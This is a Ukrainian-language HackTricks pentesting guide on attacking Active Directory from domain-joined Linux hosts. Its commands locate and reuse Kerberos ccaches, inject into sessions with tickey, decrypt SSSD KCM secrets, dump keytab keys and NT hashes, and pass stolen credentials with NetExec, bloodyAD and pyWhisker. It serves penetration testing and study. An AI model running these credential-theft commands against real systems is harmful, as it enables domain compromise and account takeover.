# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Машина Linux також може бути частиною середовища Active Directory.

Машина Linux у середовищі AD може **зберігати матеріали Kerberos локально**: user ccaches, machine/service keytabs і секрети, якими керує SSSD. Зазвичай ці артефакти можна повторно використовувати так само, як будь-які інші облікові дані Kerberos. Щоб прочитати більшість із них, потрібно бути власником облікового запису, якому належить квиток, або мати права **root** на машині.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Розвідка

### Розвідка AD з Linux

Якщо ви маєте доступ до AD із Linux (або до bash у Windows), можете спробувати [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) для розвідки AD.

Також перегляньте цю сторінку, щоб дізнатися про **інші способи розвідки AD з Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA — це альтернатива Microsoft Windows **Active Directory** з відкритим вихідним кодом, призначена переважно для середовищ **Unix**. Вона поєднує повноцінний **LDAP-каталог** із центром розподілу ключів MIT **Kerberos**, що забезпечує керування, подібне до Active Directory. Для керування сертифікатами CA та RA використовується **Certificate System** від Dogtag; також підтримується **багатофакторна** автентифікація, зокрема за допомогою смарт-карт. SSSD інтегровано для процесів автентифікації Unix.<sup>[[14]](#references)[[15]](#references)</sup> Дізнайтеся більше тут:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Артефакти вузлів, приєднаних до домену

Перш ніж працювати з квитками, з’ясуйте, **як саме вузол приєднали до AD** і **де насправді зберігаються матеріали Kerberos**. На сучасних вузлах Linux цим зазвичай керують `realmd` + `adcli` + `sssd`, а не лише звичайні файли в `/tmp`.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

Це швидко показує, чи довіряє хост AD, чи кешує SSSD ідентифікатори або квитки, а також чи доступні для зловживання **keytabs машини/служби** або **секрети KCM**.<sup>[[4]](#references)[[10]](#references)</sup>

Розглядайте `/var/lib/sss/db/cache_*.ldb` окремо від Kerberos ccaches і `/var/lib/sss/secrets/secrets.ldb`. Файли `cache_*.ldb` можуть містити офлайн-верифікатори паролів, якщо для домену задано `cache_credentials = true` **і** користувач раніше проходив автентифікацію на цьому хості. Зазвичай для читання цих файлів потрібні підвищені привілеї. Наявність файла кешу або ввімкненого параметра сама по собі не доводить, що пароль придатний до використання й актуальний; перш ніж робити такий висновок, перевірте ефективне налаштування для домену та фактичні кешовані ідентифікатори. Див. [документацію Red Hat щодо кешу облікових даних SSSD](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). Для окремої межі ідентичності між Linux і AD [зіставлення імен у Kerberos зі змішаними постачальниками](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) має значення лише тоді, коли служба приймає квиток і зіставляє його principal із відповідним обліковим записом Unix.

На хості з `ksu` дійсний Kerberos principal може отримати доступ до **локального цільового облікового запису**, зокрема root, лише якщо цей обліковий запис дозволяє principal. [У документації MIT Kerberos](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) описано файли `.k5login` і `.k5users` у домашньому каталозі цільового облікового запису, а також резервне зіставлення імен, яке використовується, якщо обидва файли відсутні. `.k5users` також може обмежувати команди для `ksu -e`; сама наявність файла не доводить, що доступна оболонка. Перевірте конкретний цільовий обліковий запис, власника й дозволи файлів, доступні для читання записи авторизації, наявні облікові дані Kerberos і діючі правила зіставлення. Якщо домашній каталог root недоступний, стан авторизації залишається невідомим. Пасивне перерахування має виявляти ці шляхи та дозволи, не запитуючи квитки й не запускаючи `ksu`.

Заплановане резервне копіювання може опосередковано створити межу авторизації `.k5login`. Якщо обліковий запис із вищими привілеями рекурсивно копіює вміст каталогу, доступного для запису користувачеві з нижчими привілеями, у власний домашній каталог, перевірте, чи охоплює копіювання приховані файли, чи є цільовий шлях фактичним домашнім каталогом облікового запису та чи належить створений файл власнику, якого приймає служба входу Kerberos. Наприклад, [у документації rsync зазначено](https://download.samba.org/pub/rsync/rsync.1.html), що `-a --no-owner` призначає новим файлам у цільовому каталозі власника-отримувача. [У документації MIT Kerberos описано](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html), як principal у файлі `.k5login` цього користувача може дозволити доступ. Перевірте обліковий запис RunAs запланованого завдання, доступ на запис до джерела, ефективні параметри rsync, вхід із увімкненим GSSAPI та дійсний квиток для зазначеного principal; доступний для запису вихідний каталог або сама команда rsync у запланованому завданні не доводять наявність такого шляху.

Доступний для читання keytab також потребує перевірки для конкретного principal. Наявність у keytab principal з адміністративною назвою сама по собі не доводить адміністративних прав: дозволені операції з principal контролюються політикою [`kadm5.acl` у KDC](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html). Перш ніж вважати доступ до keytab шляхом до root, окремо перевірте principal, чинний ACL і авторизацію локального `ksu` або входу. Під час пасивного первинного аналізу можна переглянути шлях до keytab і дозволи, не використовуючи його ключі й не звертаючись до KDC.

## Робота з квитками

### Pass The Ticket

На цій сторінці наведено різні місця, де можна **знайти квитки Kerberos на хості Linux**; на наступній сторінці ви дізнаєтеся, як перетворювати ці квитки у форматі CCache на Kirbi (формат, потрібний для Windows), а також як виконувати атаку PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Якщо вас цікавлять **способи збирання квитків, специфічні для Linux** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` тощо), див. спеціальну сторінку:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Повторне використання квитків CCACHE з /tmp

Файли CCACHE — це двійкові формати для **зберігання облікових даних Kerberos**. `FILE:/tmp/krb5cc_%{uid}` досі поширений, але в сучасних розгортаннях Linux також використовуються `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` або `KCM:%{uid}`. Перш ніж припускати, що квитки зберігаються в `/tmp`, перевірте змінну середовища **`KRB5CCNAME`** і параметр `default_ccache_name`.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Повторне використання квитка CCACHE із keyring

**Квитки Kerberos, що зберігаються в пам’яті процесу, можна викрасти**, особливо якщо захист ptrace на машині вимкнено (`/proc/sys/kernel/yama/ptrace_scope`). Для цього стане в пригоді інструмент [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), який полегшує викрадення, впроваджуючись у сеанси та зберігаючи квитки у `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Щоб налаштувати й використовувати цей інструмент, виконайте наведені нижче кроки:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Ця процедура спробує інжектуватися в різні сеанси. Про успіх свідчитиме збереження витягнутих квитків у `/tmp` за шаблоном іменування `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Повторне використання квитків CCACHE з SSSD KCM

SSSD зберігає копію бази даних за шляхом `/var/lib/sss/secrets/secrets.ldb`. Відповідний ключ зберігається в прихованому файлі за шляхом `/var/lib/sss/secrets/.secrets.mkey`. За замовчуванням ключ доступний для читання лише за наявності прав **root**.<sup>[[4]](#references)</sup>

Запуск **`SSSDKCMExtractor`** із параметрами --database і --key дасть змогу розібрати базу даних і **розшифрувати секрети**.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Екстрактор виводить необроблені JSON-дані Kerberos; перед операціями pass-the-cache/pass-the-ticket перетворіть їх на придатний для використання кеш квитків або інший формат квитків.<sup>[[4]](#references)</sup>

### Швидкий аналіз keytab

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Витягування облікових записів із /etc/krb5.keytab

Ключі облікових записів служб, необхідні для роботи служб із привілеями root, надійно зберігаються у файлах **`/etc/krb5.keytab`**. Ці ключі, подібні до паролів служб, потрібно суворо захищати від розголошення.<sup>[[5]](#references)</sup>

Щоб переглянути вміст файлу keytab, можна скористатися **`klist`**. У Linux команда `klist -k -K -e` виводить principal-и, номери версій ключів, типи шифрування та необроблений матеріал ключів. Якщо тип ключа — **23 / RC4-HMAC**, значення ключа також є **NT-хешем** цього principal-а.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Для користувачів Linux, **`KeyTabExtract`** дає змогу витягти RC4 HMAC-хеш, який можна використати для повторного використання NTLM-хешу. Зверніть увагу: це працює, лише якщо keytab досі містить матеріал **etype 23 / RC4-HMAC**. У середовищах, де використовується лише **AES**, ви можете не отримати придатний для повторного використання NT-хеш, але все одно можете безпосередньо автентифікуватися за допомогою keytab через Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

У macOS **`bifrost`** слугує інструментом для аналізу файлів keytab.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Використовуючи отримані дані облікових записів і хеші, можна встановлювати з’єднання із серверами за допомогою таких інструментів, як **`NetExec`**.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### Повторне використання облікового запису комп’ютера з `/etc/krb5.keytab`

У системах, приєднаних до домену через `realmd`/`adcli`/`sssd`, файл `/etc/krb5.keytab` зазвичай містить **обліковий запис комп’ютера** та один або кілька **principals хоста/служби**. Якщо у вас є **root**, не просто вивантажуйте його: скористайтеся одним із principals, перелічених командою `klist -k`, щоб запросити TGT і діяти як сам хост Linux.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

Це особливо корисно, коли **об’єкт комп’ютера** має делеговані права в AD або коли хосту дозволено отримувати інші секрети, наприклад **gMSA**.<sup>[[13]](#references)</sup>

### Повторне використання викрадених матеріалів Kerberos за допомогою AD-інструментів із пріоритетом Linux

Маючи дійсний `ccache` або придатний до використання keytab, можна працювати з AD **безпосередньо з Linux**, не перетворюючи спочатку все на формати Windows. Багато сучасних інструментів нативно підтримують `KRB5CCNAME` / автентифікацію Kerberos.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

Це хороший місток між **Linux post-exploitation** і **зловживанням об’єктами AD**. Щоб дізнатися про самі способи зловживання на рівні об’єктів, див.:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Артефакти Linux gMSA / Managed Service Account

У сучасних розгортаннях Linux можна безпосередньо використовувати **Managed Service Accounts** з AD. На практиці це означає, що після компрометації Linux-сервера ви можете знайти не лише keytab хоста, а й **keytab-файли для конкретних служб**, створені на основі gMSA. Зазвичай варто перевірити `/etc/gmsad.conf`, файли конфігурації, специфічні для розгортання, та додаткові файли `*.keytab` у `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

Це дає змогу повторно використовувати ідентичність Kerberos для SPN, прив’язаних до цього gMSA, **не взаємодіючи з жодною кінцевою точкою Windows**.<sup>[[13]](#references)</sup> Щоб дізнатися про зловживання gMSA/dMSA **на боці домену** після отримання вищих привілеїв в AD, дивіться:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Як атакувати Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Доступ до AD за допомогою керованого облікового запису служби — пряма інтеграція систем RHEL з Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Змінні середовища Kerberos — документація MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab — документація MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: типи шифрування Kerberos RC4-HMAC, що використовуються Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Використання Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Виявлення доменів і приєднання до них | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Посібник користувача bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Про FreeIPA | документація FreeIPA](https://www.freeipa.org/About.html)
- [15] [Примітки до випуску FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama — документація ядра Linux](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist — документація MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
